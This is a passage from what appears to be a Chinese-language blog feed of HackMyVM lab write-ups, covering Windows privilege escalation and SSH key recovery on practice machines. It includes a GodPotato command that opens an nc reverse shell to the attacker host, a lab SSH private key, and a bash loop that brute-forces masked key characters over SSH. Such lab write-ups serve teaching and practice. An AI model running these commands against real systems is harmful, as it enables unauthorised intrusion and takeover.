SeIncreaseQuotaPrivilege      Ajustar las cuotas de la memoria para un proceso  Deshabilitado
SeAuditPrivilege              Generar auditor�as de seguridad                   Deshabilitado
SeChangeNotifyPrivilege       Omitir comprobaci�n de recorrido                  Habilitada   
SeImpersonatePrivilege        Suplantar a un cliente tras la autenticaci�n      Habilitada   
SeCreateGlobalPrivilege       Crear objetos globales                            Habilitada   
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso      Deshabilitado
</code></pre>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><code>Habilitada</code>是启用的意思<br>拿到iis的权限,看到存在<code>SeImpersonatePrivilege</code>的权限<br><img src="https://ooo.0x0.ooo/2024/07/15/OR5wJt.png" alt="OR5wJt.png" loading="lazy"><br>用<code>GodPotato</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"> Directorio de c:<span class="token punctuation">\</span>inetpub<span class="token punctuation">\</span>wwwroot

<span class="token number">15</span>/07/2024  <span class="token number">11</span>:11    <span class="token operator">&lt;</span>DIR<span class="token operator">></span>          <span class="token builtin class-name">.</span>
<span class="token number">15</span>/07/2024  <span class="token number">11</span>:11    <span class="token operator">&lt;</span>DIR<span class="token operator">></span>          <span class="token punctuation">..</span>
08/10/2023  <span class="token number">23</span>:22    <span class="token operator">&lt;</span>DIR<span class="token operator">></span>          03-comming-soon
<span class="token number">15</span>/07/2024  09:58             <span class="token number">3.390</span> a.aspx
08/10/2023  <span class="token number">21</span>:46    <span class="token operator">&lt;</span>DIR<span class="token operator">></span>          aspnet_client
08/10/2023  <span class="token number">23</span>:14    <span class="token operator">&lt;</span>DIR<span class="token operator">></span>          common-js
08/10/2023  <span class="token number">23</span>:14    <span class="token operator">&lt;</span>DIR<span class="token operator">></span>          fonts
<span class="token number">15</span>/07/2024  <span class="token number">11</span>:11            <span class="token number">57.344</span> GodPotato-NET4.exe
08/10/2023  <span class="token number">23</span>:14    <span class="token operator">&lt;</span>DIR<span class="token operator">></span>          images
08/10/2023  <span class="token number">23</span>:26             <span class="token number">1.481</span> index.html
<span class="token number">15</span>/07/2024  <span class="token number">11</span>:11            <span class="token number">45.272</span> nc.exe
<span class="token number">15</span>/07/2024  <span class="token number">10</span>:25            <span class="token number">27.136</span> PrintSpoofer64.exe
               <span class="token number">5</span> archivos        <span class="token number">134.623</span> bytes
               <span class="token number">7</span> <span class="token function">dirs</span>  <span class="token number">45.442</span>.490.368 bytes libres</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">c:<span class="token punctuation">\</span>inetpub<span class="token punctuation">\</span>wwwroot<span class="token operator">></span>GodPotato-NET4.exe <span class="token parameter variable">-cmd</span> <span class="token string">"nc -t -e cmd.exe 192.168.56.104 4567"</span>
GodPotato-NET4.exe <span class="token parameter variable">-cmd</span> <span class="token string">"nc -t -e cmd.exe 192.168.56.104 4567"</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> CombaseModule: 0x140708843945984
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> DispatchTable: 0x140708846263536
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> UseProtseqFunction: 0x140708845638816
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> UseProtseqFunctionParamCount: <span class="token number">6</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> HookRPC
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Start PipeServer
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> CreateNamedPipe <span class="token punctuation">\</span><span class="token punctuation">\</span>.<span class="token punctuation">\</span>pipe<span class="token punctuation">\</span>cf276d24-495a-4cd5-8ad3-d586c03f009e<span class="token punctuation">\</span>pipe<span class="token punctuation">\</span>epmapper
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Trigger RPCSS
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> DCOM obj GUID: 00000000-0000-0000-c000-000000000046
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> DCOM obj IPID: 0000f402-065c-ffff-98de-264ea055dde3
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> DCOM obj OXID: 0x551d19d2e94d62c7
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> DCOM obj OID: 0x39b652078519bd3e
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> DCOM obj Flags: 0x281
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> DCOM obj PublicRefs: 0x0
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Marshal Object bytes len: <span class="token number">100</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> UnMarshal Object
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Pipe Connected<span class="token operator">!</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> CurrentUser: NT AUTHORITY<span class="token punctuation">\</span>Servicio de red
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> CurrentsImpersonationLevel: Impersonation
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Start Search System Token
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> PID <span class="token builtin class-name">:</span> <span class="token number">744</span> Token:0x852  User: NT AUTHORITY<span class="token punctuation">\</span>SYSTEM ImpersonationLevel: Impersonation
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Find System Token <span class="token builtin class-name">:</span> True
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> UnmarshalObject: 0x80070776
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> CurrentUser: NT AUTHORITY<span class="token punctuation">\</span>SYSTEM
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> process start with pid <span class="token number">1876</span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">4567</span>
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">4567</span> <span class="token punctuation">..</span>.
connect to <span class="token punctuation">[</span><span class="token number">192.168</span>.56.104<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.56.197<span class="token punctuation">]</span> <span class="token number">49679</span>
<span class="token function">id</span>
Microsoft Windows <span class="token punctuation">[</span>Versi�n <span class="token number">10.0</span>.17763.107<span class="token punctuation">]</span>
<span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token number">2018</span> Microsoft Corporation. Todos los derechos reservados.
c:<span class="token punctuation">\</span>inetpub<span class="token punctuation">\</span>wwwroot<span class="token operator">></span>whoami
<span class="token function">whoami</span>
nt authority<span class="token punctuation">\</span>system</code></pre>
<p>拿到system权限</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">c:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrador<span class="token punctuation">\</span>Desktop<span class="token operator">></span>type root.txt
<span class="token builtin class-name">type</span> root.txt
SIMPLE<span class="token punctuation">&#123;</span>******<span class="token punctuation">&#125;</span></code></pre>
<p>顺便读下userflag</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">c:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>marcos<span class="token punctuation">\</span>Desktop<span class="token operator">></span>type u*
<span class="token builtin class-name">type</span> u*

user.txt


SIMPLE<span class="token punctuation">&#123;</span>******<span class="token punctuation">&#125;</span></code></pre>

]]></content>
      <categories>
        <category>HackMyVM</category>
      </categories>
      <tags>
        <tag>SMB爆破</tag>
        <tag>aspx反弹shell</tag>
        <tag>SeImpersonatePrivilege</tag>
      </tags>
  </entry>
  <entry>
    <title>HackMyVM-Puiblishe</title>
    <url>/posts/1c8b7cf7/</url>
    <content><![CDATA[<p><strong>难度:easy</strong></p>
<p><strong>kali:192.168.56.104</strong></p>
<p><strong>靶机:192.168.56.123</strong></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> arp-scan <span class="token parameter variable">-l</span>
Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: <span class="token number">192.168</span>.56.104
Starting arp-scan <span class="token number">1.10</span>.0 with <span class="token number">256</span> hosts <span class="token punctuation">(</span>https://github.com/royhills/arp-scan<span class="token punctuation">)</span>
<span class="token number">192.168</span>.56.1    0a:00:27:00:00:05       <span class="token punctuation">(</span>Unknown: locally administered<span class="token punctuation">)</span>
<span class="token number">192.168</span>.56.100  08:00:27:b3:c3:63       PCS Systemtechnik GmbH
<span class="token number">192.168</span>.56.123  08:00:27:35:43:84       PCS Systemtechnik GmbH

<span class="token number">3</span> packets received by filter, <span class="token number">0</span> packets dropped by kernel
Ending arp-scan <span class="token number">1.10</span>.0: <span class="token number">256</span> hosts scanned <span class="token keyword">in</span> <span class="token number">1.934</span> seconds <span class="token punctuation">(</span><span class="token number">132.37</span> hosts/sec<span class="token punctuation">)</span>. <span class="token number">3</span> responded
</code></pre>
]]></content>
      <categories>
        <category>HackMyVM</category>
      </categories>
  </entry>
  <entry>
    <title>HackMyVM-Stars</title>
    <url>/posts/601a25e4/</url>
    <content><![CDATA[<p><strong>难度:Easy</strong></p>
<p><strong>kali:192.168.1.105</strong></p>
<p><strong>靶机:192.168.1.106</strong></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> arp-scan <span class="token parameter variable">-l</span>
Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: <span class="token number">192.168</span>.1.105
Starting arp-scan <span class="token number">1.10</span>.0 with <span class="token number">256</span> hosts <span class="token punctuation">(</span>https://github.com/royhills/arp-scan<span class="token punctuation">)</span>
<span class="token number">192.168</span>.1.1     <span class="token number">78</span>:60:5b:04:b4:8c       TP-LINK TECHNOLOGIES CO.,LTD.
<span class="token number">192.168</span>.1.106   08:00:27:24:06:b9       PCS Systemtechnik GmbH</code></pre>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> nmap <span class="token number">192.168</span>.1.106 
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-07-22 <span class="token number">13</span>:21 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.1.106
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.000062s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">998</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT   STATE SERVICE
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>  http
MAC Address: 08:00:27:24:06:B9 <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>

Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">0.15</span> seconds

 ~/Desktop                                                                                             root@kali2  <span class="token number">13</span>:21:56 
<span class="token operator">></span> nmap <span class="token number">192.168</span>.1.106  <span class="token parameter variable">-sV</span> <span class="token parameter variable">-A</span> -p22,80
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-07-22 <span class="token number">13</span>:22 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.1.106
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00021s latency<span class="token punctuation">)</span>.

PORT   STATE SERVICE VERSION
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">8</span>.4p1 Debian <span class="token number">5</span> <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">3072</span> 9e:f1:ed:84:cc:41:8c:7e:c6:92:a9:b4:29:57:bf:d1 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
<span class="token operator">|</span>   <span class="token number">256</span> 9f:f3:93:db:72:ff:cd:4d:5f:09:3e:dc:13:36:49:23 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> e7:a3:72:dd:d5:af:e2:b5:77:50:ab:3d:27:12:0f:ea <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>  http    Apache httpd <span class="token number">2.4</span>.51 <span class="token variable"><span class="token punctuation">((</span>Debian<span class="token punctuation">))</span></span>
<span class="token operator">|</span>_http-server-header: Apache/2.4.51 <span class="token punctuation">(</span>Debian<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-title: Cours PHP <span class="token operator">&amp;</span> MySQL
MAC Address: 08:00:27:24:06:B9 <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
Warning: OSScan results may be unreliable because we could not <span class="token function">find</span> at least <span class="token number">1</span> <span class="token function">open</span> and <span class="token number">1</span> closed port
Device type: general purpose
Running: Linux <span class="token number">4</span>.X<span class="token operator">|</span><span class="token number">5</span>.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux <span class="token number">4.15</span> - <span class="token number">5.8</span>
Network Distance: <span class="token number">1</span> hop
Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
<span class="token number">1</span>   <span class="token number">0.21</span> ms <span class="token number">192.168</span>.1.106</code></pre>
<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p><img src="https://ooo.0x0.ooo/2024/07/22/ORRpVr.png" alt="ORRpVr.png" loading="lazy"><br><code>but not empty</code><br><img src="https://ooo.0x0.ooo/2024/07/22/ORRPqM.png" alt="ORRPqM.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/07/22/ORRRrG.png" alt="ORRRrG.png" loading="lazy"><br>在cookie里面发现一串编码<br><img src="https://ooo.0x0.ooo/2024/07/22/ORRtQ1.png" alt="ORRtQ1.png" loading="lazy"><br>给了一个目录<code>poisonedgift.txt</code><br><img src="https://ooo.0x0.ooo/2024/07/22/ORR43I.png" alt="ORR43I.png" loading="lazy"></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAsruS5/Cd7clZ+SJJj0cvBPtTb9mfFvoO/FDtQ1i8ft3IZC9tHsKP
ut0abGtFGId9R0OB1ONB+iOMK5QNpoCXda3RDXJQ9oRCWjd2DxqRAyvdThhxq6wYJSATpa
l7M9UemrK/aDuZTAqLUSA9Zvpx474TiWXBMjdGqN2K/+SCf/DqIyknDLDRexe0Lc0IsNCV
/O39j4XJprHXMQZNaiokSuzV3VlXAYYBcTIK2Id/EMerpQdiNjMGvVIuBxfbF9/MGhEnR+
1fxxPTHZnKw5snlb47ynWtahCuZVVQr0b+c5z6MXVSJKP8LY0m8clQqUCwbPbCJnRJRCwh
TJY/xz0cu4H+Lbtx38iUv6NjiPXsvd/0FPjmNWrIwA3m4yYQL1dmSCX7JZAqYV5axI8box
Z4oHJP5dHADWdzic2XSqDSpIMxnDhlLh02ksCfNbkNkqbsiw/AO6IxnToPLH7jVjoYxnmA
y97klEGvt2UqIugfUV1p6j1sybTcM59ZUbo16i47AAAFiNnGZRvZxmUbAAAAB3NzaC1yc2
EAAAGBALK7kufwne3JWfkiSY9HLwT7U2/Znxb6DvxQ7UNYvH7dyGQvbR7Cj7rdGmxrRRiH
fUdDgdTjQfojjCuUDaaAl3Wt0Q1yUPaEQlo3dg8akQMr3U4YcausGCUgE6WpezPVHpqyv2
g7mUwKi1EgPWb6ceO+E4llwTI3Rqjdiv/kgn/w6iMpJwyw0XsXtC3NCLDQlfzt/Y+Fyaax
1zEGTWoqJErs1d1ZVwGGAXEyCtiHfxDHq6UHYjYzBr1SLgcX2xffzBoRJ0ftX8cT0x2Zys
ObJ5W+O8p1rWoQrmVVUK9G/nOc+jF1UiSj/C2NJvHJUKlAsGz2wiZ0SUQsIUyWP8c9HLuB
/i27cd/IlL+jY4j17L3f9BT45jVqyMAN5uMmEC9XZkgl+yWQKmFeWsSPG6MWeKByT+XRwA
1nc4nNl0qg0qSDMZw4ZS4dNpLAnzW5DZKm7IsPwDuiMZ06Dyx+41Y6GMZ5gMve5JRBr7dl
KiLoH1Fdaeo9bMm03DOfWVG6NeouOwAAAAMBAAEAAAGBAICL9cGJRhzCZ0qOhXdeDAw6Mi
1MyGX/HQ4Nqkd4p8FbA4hCr+mipzsPULTPhdd5gvnhLJyPgmFEdcjV5+drrwM9KxDPujlC
sHIwV2HPiqJMRxOm8wI0eP0ij97jATArRKKgkpeF3eBZ6Q9E78SDtavFhkmYfJYAOXq0NA
eNMuqPu+Xj8CjpdxBf4P/b6jc5HdbW2DoEUB7q40loLf+AJbAZnEthuPjoh1sBUdmfwhyw
btv3boRquJsrYt1JJ***qguwyDSLtXj4Wuxa7jZcLLSAuTHS+zWKwZA/8J1IpZAZhgkVXJ
fC8ZbG0M63VEQjuGXCuIY3cq1iQuXERhhbRuJ1XZT8Hki5YBaU/f5Wp7bId25Aps4ktljU
r67S9mwwppQ8dVmP6CsENgc3ivpWCDWC4PZojTgZ4qhWMpjCaUxe1Hi7GuvlRJNLL4A7Fx
kTV9nBcLlGfqzvVUPeEAZgXz4IxCx8KdTrDr/oXWw4hjqtuyRKveMjmKQ6HADFl7SMCQAA
AMBz8rqB0Mfb4U34LeA1kdZLFsGX3AZqahTDjEcZYAPI/A5Dt5iw0LcGRgrHuPccS5fA3E
GT2FceoMX2ccE5fEVydxcj2vcnPIQ01P6fxjVXpA7QDnJ2At2LLPcD9CuuSt/HCrp/Bmjv
IUFvjSgKl5nYGPfoeitIdFdM72liQ+0814iNzxNl5WuNeiJ+XAGuXqJT02gAxMRQPiJ67e
sMzJyVvM69B0kGkyAXTO9fcfq+X2JaCz3hId6Iwr68Mxe/L6MAAADBAOEpkHeU8xn5MHwG
79vpd6Cg7p1UqfDuvMOgvZe6eIOE3FIb1nWpCqjq9P0Myv8aCWYhwgKr3SNIWkZ1u+0NR9
43cZO7FWa4/DvI5gX6dlrcGy1BVoDuMWIWDw9bgXpQiGQSkQOQ3J/RPWH/xT5LQbrBVTK8
C8r4lrWDwWLMgk1Wbef6U0NBuY1+J4Hafsz2Psei3yFsjjA3djonb8JF+RnHRoO8TeJlj4
RjbkXTlhsGkdR77PNZmkZ2KVwn2VzsPwAAAMEAyzYixNTrJ4vPtjUluq7+O9qGwqpbl3i0
9ESSrC2NzbsA2afNjCWhfaLPpfNYR2gA1aQUgdRxNSM78P+plFhMUeGwTIsLsKEkbbtSqF
nUU/g3yNGFr4Die7AB0vZSHwWaQFMf+ZfXNwVRa0jmKfUc/itXgwxi3oqtWTJA7YKmXdrD
03EN/DboyflPcbmTJ4D6E6XqTeyfGamr0w5aelqqwTh/Mm+DuoHHiPMYThUMrG4iUvSRaz
<span class="token assign-left variable">ZgGQTtZoQRxi8FAAAADXNvcGhpZUBkZWJpYW4BAgMEBQ</span><span class="token operator">==</span>
-----END OPENSSH PRIVATE KEY-----</code></pre>
<p>给了个ssh私钥，但是中间有三个星号，并且不知道用户名，另一端同步进行的目录扫描出来了结果</p>
<h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> gobuster <span class="token function">dir</span> <span class="token parameter variable">-u</span> http://192.168.1.106 <span class="token parameter variable">-x</span> html,txt,php,bak,zip <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Gobuster v3.6
by OJ Reeves <span class="token punctuation">(</span>@TheColonial<span class="token punctuation">)</span> <span class="token operator">&amp;</span> Christian Mehlmauer <span class="token punctuation">(</span>@firefart<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Url:                     http://192.168.1.106
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Method:                  GET
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Threads:                 <span class="token number">10</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Negative Status codes:   <span class="token number">404</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> User Agent:              gobuster/3.6
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Extensions:              txt,php,bak,zip,html
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Timeout:                 10s
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Starting gobuster <span class="token keyword">in</span> directory enumeration mode
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
/.html                <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">278</span><span class="token punctuation">]</span>
/.php                 <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">278</span><span class="token punctuation">]</span>
/index.php            <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span>
/.html                <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">278</span><span class="token punctuation">]</span>
/.php                 <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">278</span><span class="token punctuation">]</span>
/server-status        <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">278</span><span class="token punctuation">]</span>
/sshnote.txt          <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">117</span><span class="token punctuation">]</span>
Progress: <span class="token number">1102732</span> / <span class="token number">1323366</span> <span class="token punctuation">(</span><span class="token number">83.33</span>%<span class="token punctuation">)</span>^C
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Keyboard interrupt detected, terminating.
Progress: <span class="token number">1105730</span> / <span class="token number">1323366</span> <span class="token punctuation">(</span><span class="token number">83.55</span>%<span class="token punctuation">)</span></code></pre>
<p>又拿到一个目录<code>sshnote.txt</code><br><img src="https://ooo.0x0.ooo/2024/07/22/ORRHiD.png" alt="ORRHiD.png" loading="lazy"><br>给了一个用户名<code>sophie</code>并且告诉ssh私钥有三个大写字母被*替换了<br>尝试爆破,抄了一个看起来比较简洁的脚本</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> crunch <span class="token number">3</span> <span class="token number">3</span> ABCDEFGHIJKLMNOPQRSTUVWXYZ <span class="token operator">></span> dict.txt
<span class="token operator">></span> crunch <span class="token number">3</span> <span class="token number">3</span> ABCDEFGHIJKLMNOPQRSTUVWXYZ <span class="token operator">></span> dict.txt
<span class="token operator">></span> <span class="token function">mkdir</span> keysdir
<span class="token operator">></span> <span class="token function">vi</span> run.sh</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>
<span class="token assign-left variable">key</span><span class="token operator">=</span>id_rsa
<span class="token assign-left variable">keys</span><span class="token operator">=</span>keysdir
<span class="token assign-left variable">dict</span><span class="token operator">=</span>dict.txt

<span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">cat</span> $dict<span class="token variable">)</span></span><span class="token punctuation">;</span> <span class="token keyword">do</span>
<span class="token builtin class-name">echo</span> <span class="token variable">$i</span>
<span class="token function">sed</span> <span class="token string">"s/\*\*\*/<span class="token variable">$i</span>/"</span> <span class="token variable">$key</span> <span class="token operator">></span> <span class="token variable">$keys</span>/<span class="token variable">$i</span>.rsa
<span class="token function">clear</span>
<span class="token keyword">done</span><span class="token punctuation">;</span>

<span class="token builtin class-name">cd</span> keysdir
<span class="token function">chmod</span> <span class="token number">600</span> *

<span class="token keyword">for</span> <span class="token for-or-select variable">k</span> <span class="token keyword">in</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">ls</span> <span class="token parameter variable">-1</span> *<span class="token variable">)</span></span><span class="token punctuation">;</span> <span class="token keyword">do</span>
<span class="token builtin class-name">echo</span> <span class="token variable">$k</span>
<span class="token function">ssh</span> <span class="token parameter variable">-i</span> <span class="token variable">$k</span> sophie@192.168.1.106 <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
<span class="token function">clear</span>
<span class="token keyword">done</span><span class="token punctuation">;</span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">BOM.rsa
Linux debian <span class="token number">5.10</span>.0-9-amd64 <span class="token comment">#1 SMP Debian 5.10.70-1 (2021-09-30) x86_64</span>

The programs included with the Debian GNU/Linux system are <span class="token function">free</span> software<span class="token punctuation">;</span>
the exact distribution terms <span class="token keyword">for</span> each program are described <span class="token keyword">in</span> the
individual files <span class="token keyword">in</span> /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Jul <span class="token number">22</span> 09:58:28 <span class="token number">2024</span> from <span class="token number">192.168</span>.1.105
sophie@debian:~$ </code></pre>
<p>拿到shell</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><pre class="language-bash" data-language="bash"><code class="language-bash">sophie@debian:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> sophie on debian:
    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin

User sophie may run the following commands on debian:
    <span class="token punctuation">(</span>ALL <span class="token builtin class-name">:</span> ALL<span class="token punctuation">)</span> NOPASSWD: /usr/bin/chgrp</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">sophie@debian:~$ <span class="token function">sudo</span> <span class="token function">chgrp</span> <span class="token parameter variable">--help</span>
Usage: <span class="token function">chgrp</span> <span class="token punctuation">[</span>OPTION<span class="token punctuation">]</span><span class="token punctuation">..</span>. GROUP FILE<span class="token punctuation">..</span>.
